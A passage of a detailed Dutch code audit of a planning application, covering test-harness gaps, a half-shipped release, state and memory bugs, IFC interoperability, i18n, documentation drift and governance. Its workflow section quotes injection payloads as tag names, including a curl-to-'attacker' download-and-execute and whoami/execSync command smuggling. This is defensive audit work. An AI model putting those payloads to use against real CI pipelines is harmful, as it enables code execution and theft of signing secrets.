*Fix:* maak `canon` sleutel-gedreven — een `Record<keyof Task, (t: Task) => unknown>`-tabel met expliciete `'skip'`-markers voor bewuste gaten, hetzelfde patroon dat `moveProject.ts` en `DOCUMENT_FIELDS` al gebruiken. Doe dit voor `Task`, `TaskTime`, `Sequence`, `Resource`, `ResourceAssignment`, `WorkCalendar`, `Project` en `Baseline`.

**(b) Een testcase kan vacuüm groen zijn, en de oorzaak is dat `tests/` niet wordt getypecheckt.** `harness.ts:205` typeert `expect: any`. Bewezen: een casus met onzinsleutels (`taskss`, `projectEndd`, `criticalPathh`) en absurde waarden → **groen**; `"expect": {}` → **groen**. De review verbreedde het: er is helemaal geen runtime-schemavalidatie op de casus-JSON, niet alleen op `expect`. Een typefout in `previewExpectt` laat het complete assertieblok stil verdwijnen; `linkss` gooit de relaties weg zodat de case een ander scenario doorrekent. Elke optionele sleutel gedraagt zich zo.

De review vond ook de **root cause**, die het deelrapport miste: `tsconfig.json` heeft `include: ["src"]`. Scripts en tests — samen ~7.900 regels TypeScript, inclusief de CI-blokkerende `verify-docs.ts` — draaien via esbuild, dat types strípt zonder te controleren. Daarom kon `expect: any` overleven.

Twee nuanceringen van de review, die de conclusie niet raken maar de formulering wel: leeg `expect` levert niet "nul assertions" op (de harness draait op elke case drie universele invarianten, `harness.ts:818-856`), en de "≈8.000 assertions" uit het rapport is geen kwaliteitssignaal — 7.105 daarvan komen uit drie parameter-sweeps, terwijl het belangrijkste contract er 14 rapporteert.

*Fix:* één `tsconfig.tests.json` (scripts + tests, zelfde strictness) als CI-stap, plus een discriminated `Case`-interface. Dat lost (b) en de casus-validatie in één klap op. Voeg ook een batterij-telling toe: `run.sh` globt `cases-*.json`, dus een bij een rebase verdwenen bestand geeft stil groen met een lager totaal.

---

### K11 — De uitleverketen faalt stil: geen tag↔versie-verificatie, en v2026.7.12 is aantoonbaar half uitgeleverd — **hoog**

**(a) Geen versiepoort.** `release.yml:26-33` leidt de versie uitsluitend uit de git-ref af. Vergeet je `npm run bump`, dan bouwt release `v2026.7.13` binaries die `2026.7.12` dragen en een `latest.json` met de oude versie — de release is **stil onzichtbaar** voor alle bestaande installaties, want de updater vergelijkt gelijke versies. Andersom levert het een eeuwige updateloop. `bump-version.js` heeft geen `--check`-modus. Verzwarend: de opstart-updatercheck is volledig stil (`updaterService.ts:98-104` gooit fouten in silent-modus weg zonder log), dus niemand merkt het. Vijf regels bash lossen dit op; het is de goedkoopste hoog-rendement-fix in het hele onderzoek.

**(b) En de hypothetische faalmodus is vorige week echt gebeurd.** Dit is volledig gemist door het workflow-deelrapport en door de review aan het licht gebracht, met bewijs:

- `release.yml`-run #24 (id `29988354936`) was een **`workflow_dispatch` op `main`**, geen tag-push. Zo is v2026.7.12 uitgebracht.
- De release-API voor `v2026.7.12` geeft `target_commitish: main` en **14 assets — geen enkel `.snap`**.
- `snap.yml` heeft voor v2026.7.12 **geen enkele run**; de laatste is #20, voor v2026.7.11.
- Oorzaak: het draft-release werd gepubliceerd door `GITHUB_TOKEN`, dus GitHub maakte de tag zonder `push`-event, en tokengedreven events triggeren geen workflows. `snap.yml` hangt uitsluitend aan `push: tags: v*`.
- De tag `v2026.7.12` wijst naar `65961b1` (`perf(state): undo-snapshot…`), **niet** naar de bumpcommit `bacfa72` (`chore(release): v2026.7.12`).

**(c) En de release-notes zijn twee releases op rij leeg.** De release-body van v2026.7.12 is byte-voor-byte de hardgecodeerde placeholder uit `release.yml:46`, en de `notes` in `latest.json` zijn `""` voor **zowel 7.11 als 7.12** (7.10: 1264 tekens, 7.9: 1611, 7.8: 3662). De in-app updater toonde dus twee keer een lege wijzigingsomschrijving. `release.yml` schrijft `notes` überhaupt nooit — er gaat geen `releaseBody`-input naar de tauri-action.

Het voorgestelde fix (release-notes vóór de tag committen en door `publish-release` laten lezen) werkt niet zoals opgeschreven: die job **heeft geen checkout-stap** en kan dus geen repo-bestand lezen, en `latest.json` wordt als laatste geschreven door `build-windows` — publish-release zou het moeten downloaden, patchen en her-uploaden.

**Fix.** Versievergelijking als blokkerende stap in de gate-job (samen met K9's testpoort). `snap.yml` omhangen aan `workflow_run` op "Build and Release" met success-gate — dat lost tegelijk de dispatch-gap, de 30-minuten-pollinglus en de Snap-Store-volgorde op. Release-notes vóór de tag committen, mét checkout in `publish-release` en een expliciete download-patch-upload van `latest.json`.

---

## 3. Per gebied

Compacte samenvattingen van wat er per deelgebied nog meer speelt. De kritieke bevindingen uit §2 worden hier niet herhaald.

### 3.1 Architectuur & state

*Details: `deelrapporten/rapport-architectuur.md` + `reviews/review-architectuur.md`.* De review noemde dit "het best onderbouwde deelrapport" en rekende vrijwel elk getal na tot op de regel. Eén meetfout: `src/state/` is **4.174** regels, niet 4.194.

**De tweelingbug van het CPM-contract, gevonden door de review en niet onderhandelbaar.** `payloadFromInput` (`documentContract.ts:230`) zet net als `payloadFromImport` `scheduleStale: false` + `cpmResult: null`, en wordt door `documentSlice.ts:190` gebruikt voor de **inactieve documenten bij crash-recovery**. Bewust zo gelaten, met als redenering "de uitkomst is pas zichtbaar als je erheen switcht" — maar `switchDocument` (`:95-119`) roept **nooit** `runCPM` aan. Herstel drie documenten, switch naar de tweede: geen kritiek pad, geen float, en omdat `scheduleStale: false` staat toont `StatusBar.tsx:59` géén waarschuwing. Dat is precies de "planning die er correct uitziet en het niet is" die het rapport zelf de duurste bug in een planningstool noemt — en dit zit in een verscheept gebruikerspad, terwijl het door het rapport aangevoerde bewijs (`devBridge.ts:80`, `loadState` zonder navolgende `runCPM`) dev-only is. Fix: `payloadFromInput` → `scheduleStale: true`, óf `switchDocument` laten recomputen bij `cpmResult === null`.

**Het documentcontract is gesloten aan de payload-kant, niet aan de state-kant.** Er is geen check die een nieuw *top-level state-veld* verplicht koppelt aan `DocumentPayload`. Wie `notes: string[]` aan `projectSlice` toevoegt krijgt een veld dat stilzwijgend app-globaal is: het lekt tussen documenten, staat niet in de undo-snapshot en wordt niet gereset door `newProject()`. De compiler zwijgt, de suite zwijgt. Het voorstel (een `_assertNoUnclassifiedState`) is door de review geschreven en langs `tsc` gehaald: het werkt, en de restunie is bewijsbaar exact `'viewRows'`. Wel met twee correcties: er is een derde categorie nodig (`DerivedKey` voor per-document afgeleide cache), en de check kijkt alleen top-level.

**Want binnen `ui` zit het gat dat de "ik heb alle 154 keys nagelopen"-claim miste.** Drie velden houden een taak-id vast — `editingTaskId` (`slices/types.ts:107`), `dependencySourceId` (`:109`), `inlineEditTaskId` (`:119`) — en geen ervan wordt gewist door `switchDocument`/`newDocument`/`closeDocument`; er staat geen enkele `ui`-reset in `documentSlice.ts`. Een taak-id uit document A overleeft de tabwissel naar B. Vandaag niet fataal (`TaskDialog` heeft een vangnetpad), maar exact de bugklasse die het hele ontwerp wil uitbannen. Bijvangst: `dependencySourceId` is write-only dode state — drie setters, nul lezers.

**De undo-stack is onbegrensd** en `createSnapshot` (`snapshot.ts:68-76`) deep-cloont bij élke bewerking tien collecties via `JSON.parse(JSON.stringify(…))`. Er is nergens een cap. Erger: `undoStack`/`redoStack` zitten ín het documentcontract, dus elk **inactief geopend document** houdt zijn volledige historie vast. Het geheugen schaalt als `bewerkingen × projectgrootte × open documenten`. Voor de omvang: de bestaande eigen audit `docs/superpowers/prestatie-modulariteit-audit.md` (pakket B3) meet 4,95 MB per snapshot en 248 MB na 50 bewerkingen bij 5.000 taken; dat is het geverifieerde getal, en de eigen schatting van 2,6 MB in het deelrapport moet eruit. De edgecase-review mat onafhankelijk **~150 MB geserialiseerd / ~346 MB heap bij 800 taken** na een volle stack — dezelfde orde van grootte, en tevens de correctie op de 524 MB uit het edgecase-rapport. Behandel dit als een geheugen- en prestatieprobleem, **niet** als crashpad: de `RangeError: Invalid string length` die bij 1.600 taken optreedt komt van `JSON.stringify(undoStack)` in de meetopstelling; de app serialiseert de undo-stack nergens zelf (rol `'none'` in het documentcontract). De fix is twee regels (`if (s.undoStack.length > MAX_UNDO) s.undoStack.shift();`).

**Drie runtime-importcycli rond `projectSlice`, niet twee** (eigen Tarjan-analyse in twee onafhankelijke reviews). De gemiste derde (`documentContract ↔ projectSlice`, direct) is de kortste en scherpste. En de faalmodus is anders dan geclaimd: `createDefaultProject` naar een `const` omzetten geeft **geen** TDZ-`ReferenceError` bij module-init — `DOCUMENT_FIELDS[0].fresh` legt stil `undefined` vast en de app valt pas om bij de eerste `newProject()` met `TypeError: f.fresh is not a function`. Dat is moeilijker terug te traceren dan geclaimd. De tweede helft van de claim is onjuist: `createDefaultView` naar `const` geeft 200/200 groen — `viewSlice` zit niet in de cyclus. Het voorstel (defaults naar een bladmodule `src/state/defaults.ts`) is nagerekend: de hele SCC verdwijnt.

**Verworpen voorstel.** Het rapport wilde `updateTask`'s stale-vlag afleiden uit een whitelist `DATE_RELEVANT_TASK_KEYS`. De review wees dat af: een whitelist maakt elk toekomstig `Task`-veld stilzwijgend "niet datum-relevant" — precies de stille default die de rest van het rapport wil uitbannen, opnieuw ingebouwd op de heetste actie. Het moet een **blacklist** van bewezen-onschuldige sleutels zijn; het correcte precedent staat al in de codebase (`resourceSlice.ts:237-238`, de `onlyName`-check).

Verder, allemaal bevestigd en van lagere urgentie: er is geen enkele compile-time slice-grens (`AppSlice<T>` typt elke slice tegen de héle `AppState`; de cross-slice-schrijftabel klopt op alle zeven rijen); het "trailing recompute"-ritueel wordt 54× met de hand herhaald; `UIState` is een god-object van 64 velden met 27 `show*Dialog`-booleans en één ongedifferentieerde setter die 138× wordt aangeroepen; `taskSlice.ts` (887 regels) draagt zes verantwoordelijkheden met een drievoudige waarheidsbron (`parentId` / `childIds` / rauwe volgorde) die drie keer met de hand wordt onderhouden; bulk-mutaties kosten O(n²) omdat elke `addTask` een eigen snapshot pusht; en de CPM-terugschrijf bestaat twee keer, waarbij de kopie in `services/benchmark/runner.ts:81-107` al is gedivergeerd — de benchmark meet niet meer wat de app doet.

### 3.2 IFC & bestandsformaat

*Details: `deelrapporten/rapport-ifc.md` + `reviews/review-ifc.md`.* Review-oordeel: "door — als betrouwbaar, met correcties". Elke empirische claim is nagedraaid en reproduceerde vrijwel allemaal exact.

Naast K2, K3 en K4:

**`ifcGuid` breekt aantoonbaar bij grote projecten — de review verzwaarde dit.** `ifcWriter.ts:24-37` genereert een 22-teken-"GlobalId" uit een 32-bits hash. Het deelrapport mat geen collisies over 20.000 ids en concludeerde "houdt in de praktijk stand". De review testte met de échte `generateId`-vorm: **1 collisie bij 50.000 ids, 5 bij 200.000** — exact de verjaardagsverwachting bij een 2³²-ruimte. De functie is dragend: `extractBaselines` mapt baseline-taskId's terug via `ifcGuid(bt.taskId)` (`ifcReader.ts:1302`) en `writeAssignmentMeta` gebruikt hem als property-naam (`ifcWriter.ts:866`). Een collisie geeft stille kruisbesmetting van baselines of toewijzingen.

*En de voorgestelde fix maakt het erger als je de volgorde omdraait:* een collisiecheck met suffixen bij het schrijven breekt de remap, omdat `ifcReader.ts:1302` de GUID uit de interne taskId **herberekent**. De ontkoppeling (een expliciete `Map<internalId, stepGuid>` wegschrijven) moet eerst; de collisiecheck daarna.

**Interop-gaten.** Een minimale, spec-conforme IFC waarin `IfcTaskTime` alleen `ScheduleStart`/`ScheduleFinish` draagt — heel gebruikelijk bij 4D-tools — importeert met `scheduleDuration: 0`: een taak van vijf werkdagen wordt een mijlpaal. `parseDateFromIFC` geeft bij `$` **de datum van vandaag** terug (`ifcReader.ts:195`). Per-weekdag verschillende werktijdbanden round-trippen niet: een korte vrijdag verdwijnt stil, omdat de writer bewust alleen de banden van de eerste werkdag schrijft en de reader die over alle werkdagen repliceert (`ifcWriter.ts:538-543`, `ifcReader.ts:983`). Split-shifts binnen één dag overleven wél. Een korte vrijdag is in de Nederlandse bouw geen randgeval.

*Twee waarschuwingen van de review bij de voorgestelde fixes:* `parseDateFromIFC` naar `''` laten teruggeven raakt consumenten die een geldige datumstring aannemen — dat is een aparte verbouwing, geen bijzin. En de multi-`IfcWorkTime`-oplossing voor de weekdagbanden **breekt achterwaartse compatibiliteit**: oude builds lezen alleen de eerste groep en repliceren die, dus een nieuw bestand geeft in een oude versie stil een verkeerde kalender.

**Prestaties zijn ruim voldoende, met één superlineair pad.** 5.000 taken + 5.000 relaties: 88 ms schrijven, 147 ms lezen. 20.000 taken: 232/425 ms. Lineair. De uitschieter is de kalenderbibliotheek: `extractCalendarGeneration` (`ifcReader.ts:873-916`) loopt **per kalender** de volledige entiteitenlijst af. De review mat 1000 kalenders → 437 ms, 2000 → 1182 ms. 1000 kalenders is onrealistisch, maar het patroon hoeft er niet te zijn: één index `Map<stepId, IFCPROPERTYSET[]>` maakt vier van de tien volledige passes overbodig.

**Correcties.** Het rapport stelde dat `verify:examples` niet in CI draait — onwaar, `ci.yml:71` draait het wél; alleen `gen:examples` staat er niet in. En de `entries.length === 0`-poort staat op `useRecoveryRestore.ts:84`, niet `:81`.

**Adapters.** `writeCSV` (`csvWriter.ts:37-44`) heeft zes positionele parameters waarvan er vier ongebruikt zijn — precies de vorm die bij `writeIFC` tot stil dataverlies leidde en daar is opgelost. Er is geen equivalent van `check-ifc-roundtrip.ts` voor CSV/MSPDI/P6: een veld dat wel door IFC maar niet door P6 round-trippt wordt door niets bewaakt.

### 3.3 Testbaarheid & CI

*Details: `deelrapporten/rapport-testbaarheid.md` + `reviews/review-testbaarheid.md`.* Review: "ja, dit gaat door — na correcties"; de vier vlaggenschip-claims zijn allemaal nagedraaid en reproduceren.

Naast K9 en K10:

**De dekkingskaart.** Via esbuild-`--metafile`s over alle 17 test-entrypoints: **93 van 246 bronmodules bereikt (37,8 %)**, door de review zelf hermeten en identiek. De materiële gaten liggen precies waar de churn zit: `GanttCanvas.tsx` + `canvas/hooks/` (~2.500 regels, hit-testing en drag-and-drop die taken en relaties muteren), het volledige extensiesysteem (2.159 regels), `recoveryStore.ts` (232 regels — de dataverlies-kritieke laag), `print/` + `pdf/` (~3.500 regels), `hooks/` (1.563 regels incl. `useAutoSave` en `shortcutRegistry`), en 91 van de 93 React-componenten.

"Bereikt" is bovendien niet "geassert": `fileAccess/*` wordt alleen transitief geladen; geen enkele testregel raakt de runtime-dispatch, het `FileRef`-model, de FSA-tak, de download-fallback of `recentFiles.ts`.

**Een tweede suite die door niets wordt gedraaid.** `tests/dev-server/` bevat **zes** `.test.mjs`-bestanden op `node:test` met 30 groene tests, die de poortallocatie en flock-races bewaken. Geen npm-script, geen CI-stap, geen vermelding in de README. Er is überhaupt **geen `test`-script in `package.json`** — de canonieke aanroep staat alleen in `CLAUDE.md`, `AGENTS.md` en `ci.yml`.

**Correcties op het deelrapport.** De `__APP_VERSION__`-blokkade bij extensietests bestaat niet (`extensionLoader.ts:13` en `sdk.ts:111` hebben een fallback; headless bundelen werkt). De duiding van `permissions.ts:151` was verkeerd: dat `continue` slaat een tabel-pad over dat niet op de API bestaat; dat een *nieuwe* API-methode permissieloos is komt doordat `applyPermissionGuards` over `API_PERMISSIONS` itereert in plaats van over de API — twee losse stille gaten, en de voorgestelde dekkingstest moet de API-oppervlakte tégen de tabel houden, niet andersom. `release.yml` heeft 2× `npm install`, niet 3×. En de Sprint-1-lijst noemde `barDragMath` en `dropTarget` als bestaande pure modules — die bestaan niet; `shortcutRegistry`, `projectTemplates`, `wbsTemplates` en `freePeriods` wél.

**Herwaardering van de extensiesectie.** Het rapport voerde `endsWith`-ZIP-entryselectie, zip-bommen en `compareVersions` op als beveiligingsgaten. `extensionLoader.ts:116-118` zegt zelf: *"dit is GEEN echte isolatie … permissies zijn een conventie"*. Tegen die achtergrond zijn dat **robuustheidsbugs, geen beveiligingsgaten** — de aanvaller heeft al alles. De echte HOOG-bevinding is dat er geen grens is en geen consent- of integriteitscontrole bij `installFromCatalog` (zie K6).

**Nog niet vastgesteld.** Of `run.sh` onder gelijktijdigheid clobbert (hij schrijft vaste artefactnamen in de repo-boom, wat vreemd is voor een expliciet multi-worktree-ingerichte repo) — `[VERMOED · hoog]`. Volgorde-afhankelijkheid tussen cases is niet aangetoond en waarschijnlijk klein, omdat `newProject()` sinds audit P10 key-gedreven over `DOCUMENT_FIELDS` loopt.

### 3.4 UI, i18n & platformsplit

*Details: `deelrapporten/rapport-ui-i18n.md` + `reviews/review-ui-i18n.md`.* Review-oordeel: "voorwaardelijk door — niet in deze vorm". Het meetwerk reproduceert tot op de regel, maar drie van de vier claims die de prioriteitstabel droegen waren opgeblazen.

**Wat er direct en goedkoop te repareren is (alle vier onafhankelijk bevestigd):**
- **In de browserbuild zijn de vensterknoppen dood.** `TitleBar.tsx:150-159` rendert onvoorwaardelijk minimaliseren/maximaliseren/sluiten; alle drie de handlers (`:53`, `:58`, `:68`) beginnen met `if (!isTauri()) return;`. In de productie-webdeploy ziet de gebruiker drie dode OS-knoppen. Eén regel.
- **`SettingsPanelContent.tsx:185-187` toont hardcoded `'dd-mm-jjjj'`** — Nederlands, onvertaald in alle 14 locales. En `:209-214` is een dode sectie "Standaardzoom" met een statische `<span>30 px/day</span>`.
- **`MenuBar.tsx` is dode code** met een tweede, `fileAccess`-omzeilend bestandspad, plus **196 dode vertaalregels** (de `menuBar.*`-tak, 14 keys × 14 locales, inclusief `"Open Planner Studio v0.1"`). De review voegde toe dat dit al ingepland stond: `docs/superpowers/plans/2026-07-13-browser-bestandstoegang.md:1722` is "Task 10: dode MenuBar verwijderen", afvinkvakje leeg. En `MenuBar.tsx:45-47` draagt een "R1-fix (bug-klasse B4)"-comment — iemand heeft actief een bug gerepareerd in een component die nooit rendert.
- **`scripts/i18n-diff.mjs` staat niet in `package.json` en niet in `ci.yml`** — en, door de review gevonden, het script **eindigt zonder enige `process.exit`, dus altijd exit 0**. Zelfs aansluiten in CI zonder exitcode-fix lost niets op.

**i18n is gezond, en de "88 onvertaalde strings" moeten in proportie.** De sleutelpariteit is 100 % over alle 56 JSON-bestanden; de vijftien "ontbrekende" keys zijn correcte CLDR-`_one`-gevallen in ja/ko/zh. Codekant schoon: 862 letterlijke `t()`-keys, nul ontbrekend. Het getal 88/1124 nl-strings die identiek zijn aan `en` klopt exact — maar de duiding niet: de lijst bestaat grotendeels uit woorden die in beide talen hetzelfde zijn (`"OK"`, `"#"`, `"Type"`, `"Start"`, `"Status"`, `"WBS"`, `"Resources"`, `"Benchmark"`, `"Histogram"`, `"Planning"`, `"IFC"`, `"d"`, `"Open Planner Studio"`). Echt vertaalbaar: hooguit vijftien à twintig (`"Constraint"`, `"Activity codes"`, `"Retained Logic"`, `"Progress Override"`, `"Split view"`, `"Variance"`). En het gestelde contrast klopt niet: hertelde percentages zijn nl 7,8 % · **fr 7,3 %** · **de 5,8 %** · es 4,3 % · it 3,9 % · pt 3,9 % · pl 3,6 % · tr 2,3 %. Frans zit vrijwel gelijk. Een kale drempel-assert is op deze metriek een vals-positieven-machine (faalt permanent op `"OK"`); borging vereist een allowlist voor bewust-identieke sleutels.

**De "8× dezelfde actie"-claim is geen 8 en het is niet dezelfde actie.** De elf regelverwijzingen kloppen exact, maar ze verwijzen niet naar `addTask`-aanroepen — ze verwijzen naar `createDefaultTaskTime(...)`. Van die elf zijn er vijf verschillende operaties (platte taak, subtaak, invoegen boven/onder, mijlpaal met duur 0), en `TaskDialog:33` is `emptyDraft()` — formulier-initialisatie. Écht identiek: **drie**. En de goedkope oorzaak werd gemist: `taskSlice.ts:161` valt terug op `now` in plaats van `project.startDate`; **één regel repareren en negen van de elf callsites kunnen het veld weglaten**. Het rapport stuurde in plaats daarvan aan op een `COMMANDS`-register met effort "Groot" op nummer 1 van de urgentielijst — de duurste route naar het goedkoopste probleem.

Het `COMMANDS`-voorstel zelf blijft verdedigbaar, maar is onderspecificeerd op precies het punt dat het duur maakt: `ribbonConfig.tsx:69` gebruikt `use?: () => RibbonButtonBinding` — een **React-hook** met reactieve disabled/title — terwijl `shortcutRegistry.ts:43-55` **imperatief** is (`run(store)` + `when()`). De voorgestelde vorm kiest niet: gewone functies laten de ribbon zijn reactiviteit verliezen, hooks kunnen niet vanuit de toetsenbord-dispatcher worden aangeroepen. Er is een tweedelig contract nodig (imperatieve `run` + reactieve `useEnabled`) — ongeveer de splitsing die er al is.

**Twee verder ingetrokken claims.** De "latente guard-divergentie" bij `onIndent` bestaat niet: `GanttCanvas.tsx:1357` geeft `isTreeMode` door en `ContextMenu.tsx:151` verbergt de indent/outdent-items erbuiten; het menu-item bestáát niet buiten boommodus. En de hexkleuren-telling is niet reproduceerbaar (rapport 38, eigen opsomming 32, review-grep 58) én de helft is legitiem: `SettingsPanelContent.tsx:16-18` zijn themavoorbeeld-swatches die letterlijk hex móéten zijn, `ScreenshotAnnotator.tsx:34` is het teken-inktpalet. De voorgestelde regel "geen hex in components/" zou beide illegaal maken.

**Wat wel staat en van middelgrote urgentie is:** de platformsplit is uitstekend op één lek na (`ReportPanel.tsx:232-251` herimplementeert de split omdat `saveFileDialog` alleen `string` accepteert en een PDF `Uint8Array` is — `saveBinaryFileDialog` in `fileAccess` lost dat op); `Ribbon.tsx:41` hardcodeert de tabvolgorde als tweede lijst naast `RIBBON_TABS`, waardoor een nieuwe tab wél compileert maar onzichtbaar blijft; `GanttRenderer.drawTaskTable()` (`:1387`, 180 regels) tekent de takentabel binnen de chart-renderer; de canvas-renderer heeft **nul RTL-bewustzijn**, dus voor ar/fa blijft de Gantt LTR terwijl de chrome spiegelt; en drie modale oppervlakken missen een focus-trap, waarvan `CloseDocumentDialog` juist de destructieve-keuzedialoog is.

### 3.5 Documentatie, proces & governance

*Details: `deelrapporten/rapport-docs-proces.md` + `reviews/review-docs-proces.md`.* Review-oordeel: **"nee, niet in deze vorm"** — het rapport miste de twee grootste release-gaten (die nu K9 zijn) en bevatte een verzonnen getal.

**Geen LICENSE-bestand terwijl LGPL-3.0 op vijf plaatsen wordt geclaimd.** `find . -iname "LICEN*"` is leeg; `git log --all -- LICENSE COPYING` is leeg; de GitHub-API geeft geen `license`-veld. Toch claimen `README.md:114`, `PLAN.md:815`, `PLAN.md:1605`, `CLAUDE.md:27` en `docs/wiki/Contributing.md:3,72` LGPL-3.0. Zonder licentiebestand is de code juridisch alle-rechten-voorbehouden, en `Contributing.md` laat bijdragers instemmen met een licentie die nergens is vastgelegd. (Correctie: `README.md:8` is de Talen-badge, niet de licentiebadge; de licentiebadge staat op regel 9 en rendert "unknown".)

**Documentatiedrift is het structurele patroon, en het raakt precies de documenten waar agents op varen.**
- `CLAUDE.md:8` beschrijft `npm run dev` als "Vite dev server (port 3007, strictPort … override with OPS_DEV_PORT)". Werkelijkheid: `package.json:7` → `node scripts/dev-server.mjs`, met een per-worktree gepersisteerde poort onder flock. De review scherpte het aan: de doc-zin doet aantoonbaar het **tegenovergestelde** — `dev-server.mjs` óverschrijft de env-var.
- `CLAUDE.md:19` zegt 395 cases / 21 batterijen; werkelijk 431 / 22 (zelf gedraaid). Dit getal is inmiddels op vier plaatsen mis geweest.
- **De drie belangrijkste bestanden van de state-laag ontbreken volledig**: `documentContract.ts`, `snapshot.ts` en `transaction.ts` komen nul keer voor in `CLAUDE.md`. Wie erop vaart schrijft onvermijdelijk een mutatie zonder `beginUndoable`/`finishMutation` en een nieuw documentveld zonder descriptor.
- `CLAUDE.md:67` beschrijft de auto-save als "een debounced (800 ms) store-subscription in `App.tsx`". Werkelijkheid: een **throttle van 10.000 ms** in `src/hooks/useAutoSave.ts:18`, met een comment die uitlegt waarom debounce juist verkeerd was. Verschil in dataverliesvenster: factor 12.
- **Een compleet documentatiesubsysteem ontbreekt in alle drie de agent-docs.** `public/docs/` bevat 350 artikelen (25 × 14 talen), voedt de in-app helpviewer én de GitHub-wiki, en heeft een eigen CI-poort (`verify:docs`, blokkerend in `ci.yml:73`). Nul verwijzingen in `CLAUDE.md`/`AGENTS.md`/`README.md`. Een agent die een feature bouwt weet niet dat er een 14-talige handleiding mee moet.
- **`PLAN.md` §4 beschrijft een codebase die niet bestaat**, terwijl `CLAUDE.md` PLAN.md tot "source of truth" verklaart. Van de negen genoemde spookonderdelen kloppen er acht (`web-ifc`, `ifc-rs`, `documentStore.ts`, `selectionSlice`, `filterSlice`, `leanSlice`, `vitest`, `pnpm`, `mcp-server`: nul hits). **Playwright bestaat wél** (`.mcp.json`, `main.tsx:24`, `devBridge.ts:17`) — één van de vier "bewezen onwaarheden" is er geen. Gevaarlijk omdat de boom plausibel genoeg is dat een agent hem als feit aanneemt.
- Doc-rot in de broncode zelf: `src-tauri/src/commands/mod.rs:3-5` claimt "er staat nergens `invoke()` in `src/`" — onwaar (`updaterService.ts:44-45`) — en spreekt zichzelf 35 regels lager tegen.

**Er is een verificatieharnas voor documentatie, maar het kijkt naar de verkeerde bestanden.** `verify-docs.ts` bewaakt `public/docs/**` streng in CI; voor `CLAUDE.md`/`AGENTS.md`/`PLAN.md` bestaat nul verificatie. De goedkoopste structurele ingreep is dat harnas uitbreiden met machinaal controleerbare beweringen (aantal slices, locales, ribbon-tabs uit `RIBBON_TABS`, testcases uit `run.sh`, invoke-callsites) — het draait al in CI.

**Governance.** Bus factor 1, hard: `git shortlog` geeft 123 commits op `Nozzit` + 2 op `Ethan de Wit` (**hetzelfde e-mailadres**) + 17 op `Claude` — één persoon plus diens agent. Geen `CONTRIBUTING.md`, `SECURITY.md`, `CODE_OF_CONDUCT.md`, issue- of PR-templates in de root; `docs/wiki/Contributing.md` staat op de enige plek waar GitHub hem niet toont. `CODEOWNERS` wijst `@Nozzit`, `auto-assign-issues.yml:16` wijst `DutchSailor`. Er is geen disclosure-kanaal, terwijl het project installers distribueert en een code-uitvoerend extensiesysteem draait.

De **minisign-signeersleutel is een SPOF zonder procedure**: de pubkey zit in elke binary (`tauri.conf.json:62`), en over back-up, houders of rotatie staat nergens iets. Verlies betekent dat geen enkele bestaande installatie ooit nog kan updaten. Dat de private helft *alleen* als GitHub-secret bestaat is met repo-materiaal niet vast te stellen — behandel het als aanname, niet als feit. Daarnaast zes Azure-secrets en Snapcraft-credentials zonder gedocumenteerde eigenaar of vervaldatum; Azure-client-secrets verlopen na 6–24 maanden, waarna Windows-signing geruisloos breekt.

**Twee ingetrokken punten.** De "derde versie" in `snapcraft.yaml` bestaat niet — `:3-4` is een expliciet gelabelde placeholder die in CI wordt overschreven; het voorstel om `bump-version.js` die ook te laten zetten zou juist een extra synchronisatieplicht toevoegen. En "macOS-notarisatie is nergens gedocumenteerd" is onwaar: `docs/superpowers/plans/2026-06-24-auto-update-cross-platform.md:88-98` documenteert het ontbreken expliciet, mét reden en kosten. De juiste formulering is: de bewuste afweging bereikt de eindgebruiker niet, want `docs/wiki/Installation.md` zwijgt erover.

**Archivering.** `docs/superpowers/` wordt in `CLAUDE.md` als "actieve" map met vijf onderwerpen beschreven; werkelijk staan er 43 bestanden, waarvan het overgrote deel opgeleverd is. Scherpste voorbeeld: `HANDOFF-2026-07-20-poorten-ongedraaid.md` opent met "AFGEWERKT — dit draaiboek is verbruikt" en staat in de actieve map.

**Extensie-API.** Er is geen versioneringscontract: het manifest kent alleen `minAppVersion` (een ondergrens), en CalVer draagt per definitie geen breaking-change-signaal. Een extensie met `minAppVersion: 2026.4.0` activeert vrolijk op 2027.3.0 na drie API-wijzigingen. Bij de verwijdering van de `commands`-permissie was de gekozen oplossing "stil wegfilteren" — extensies falen dus stil. Daarnaast lekken twee interne types in het publieke contract: `RibbonTab` (die NL/EN mengt met `beeld`/`instellingen` en dus hernoemd gaat worden) en `CjkFontProvider` uit de pdf-internals.

### 3.6 Workflows & release-infrastructuur

*Details: `deelrapporten/rapport-workflows.md` + `reviews/review-workflows.md`.* Review-oordeel: **"nee, niet in deze vorm"** — het skelet is bruikbaar, maar de prioriteitslijst stuurde de lezer verkeerd.

Naast K9 en K11:

**Script-injectie via tag- en dispatch-input: zeven locaties, niet zes.** De tabel in het rapport noemde er zes; sectie 4 noemde voor `snap.yml` een zevende (`:81`) die niet in de tabel stond. Volledig: `release.yml:30,40,158` + `snap.yml:30,45,68,81`. Elke `${{ }}` uit een tagnaam of `workflow_dispatch`-input wordt letterlijk in een shellscript geplakt vóór de shell start.

*Twee correcties op de ernst.* (a) De PoC-tag `v1.0$(curl attacker/x|iex)` is **geen geldige git-tagnaam** (spatie). De klasse blijft volledig overeind — `'`, `"`, `` ` ``, `$`, `(`, `)`, `;`, `|`, `&`, `/` zijn allemaal toegestaan, en `v1.0$(id)`, `v1.0";whoami;"` en `v1.0'+require('child_process').execSync('id')+'` zijn geldige tagnamen — maar een payload met URL is via de tagroute lastig. Belangrijker: de **`workflow_dispatch`-route kent geen enkele tekenbeperking**, en dat is de route die in de praktijk gebruikt is (zie K11b). (b) De secret-blootstelling is overdreven: `release.yml:30/:40` zitten in `create-release` met alleen `GITHUB_TOKEN`; alleen `:158` zit in de job met de signing key én de Azure-credentials, en dat is ook de pwsh-double-quoted context waar `$( )` daadwerkelijk geëvalueerd wordt. Voor `snap.yml` geldt dat `SNAPCRAFT_STORE_CREDENTIALS` **niet gezet is** — de publish-stap is `skipped` — dus dat deel is latent, niet actief.

**De twee bevindingen die het rapport zelf op plek 1 en 2 zette, moeten omlaag.**
- *Plek 2, de ontbrekende `await` op `release.yml:268`:* de beschreven faalmodus ("job groen, release blijft draft") **bestaat niet**. De review speelde het na op Node v22.22.2, de versie die de workflow zelf pint: een rejectie is fataal sinds Node 15 en de open socket houdt de event-loop levend, dus de stap **faalt luidruchtig** met exit 1. Empirisch bevestigd op run 29723780935. De `await` moet er alsnog in (onleesbare stacktrace, volgorde t.o.v. `core.setOutput` niet gegarandeerd), maar dit is LAAG/MIDDEL.
